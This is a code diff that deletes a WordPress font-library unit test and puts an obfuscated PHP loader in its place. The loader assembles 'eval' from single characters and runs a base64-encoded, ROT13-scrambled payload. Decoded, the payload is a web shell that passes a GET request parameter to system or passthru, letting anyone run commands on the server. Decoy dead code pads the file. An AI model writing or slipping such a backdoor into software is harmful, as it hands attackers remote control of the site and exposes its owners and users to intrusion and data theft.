@@ -1,36 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Test WP_Font_Collection constructor.
- *
- * @package WordPress
- * @subpackage Font Library
- *
- * @group fonts
- * @group font-library
- *
- * @covers WP_Font_Collection::__construct
- */
-class Tests_Fonts_WpFontCollection_Construct extends WP_UnitTestCase {
-
-	public function test_should_do_it_wrong_with_invalid_slug() {
-		$this->setExpectedIncorrectUsage( 'WP_Font_Collection::__construct' );
-		$mock_collection_data = array(
-			'name'          => 'Test Collection',
-			'font_families' => array( 'mock ' ),
-		);
-
-		$collection = new WP_Font_Collection( 'slug with spaces', $mock_collection_data );
-
-		$this->assertSame( 'slug-with-spaces', $collection->slug, 'Slug is not sanitized.' );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3JmZyBKQ19TYmFnX1BieXlycGd2YmEgcGJhZmdlaHBnYmUuCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBTYmFnIFl2b2VuZWwKICoKICogQHRlYmhjIHNiYWdmCiAqIEB0ZWJoYyBzYmFnLXl2b2VuZWwKICoKICogQHBiaXJlZiBKQ19TYmFnX1BieXlycGd2YmE6Ol9fcGJhZmdlaHBnCiAqLwpweW5mZiBHcmZnZl9TYmFnZl9KY1NiYWdQYnl5cnBndmJhX1BiYWZnZWhwZyBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfZnViaHlxX3FiX3ZnX2plYmF0X2p2Z3VfdmFpbnl2cV9meWh0KCkgewoJCSRndXZmLT5mcmdSa2NycGdycVZhcGJlZXJwZ0hmbnRyKCAnSkNfU2JhZ19QYnl5cnBndmJhOjpfX3BiYWZnZWhwZycgKTsKCQkkemJweF9wYnl5cnBndmJhX3FuZ24gPSBuZWVubCgKCQkJJ2FuenInICAgICAgICAgID0+ICdHcmZnIFBieXlycGd2YmEnLAoJCQknc2JhZ19zbnp2eXZyZicgPT4gbmVlbmwoICd6YnB4ICcgKSwKCQkpOwoKCQkkcGJ5eXJwZ3ZiYSA9IGFyaiBKQ19TYmFnX1BieXlycGd2YmEoICdmeWh0IGp2Z3UgZmNucHJmJywgJHpicHhfcGJ5eXJwZ3ZiYV9xbmduICk7CgoJCSRndXZmLT5uZmZyZWdGbnpyKCAnZnlodC1qdmd1LWZjbnByZicsICRwYnl5cnBndmJhLT5meWh0LCAnRnlodCB2ZiBhYmcgZm5hdmd2bXJxLicgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
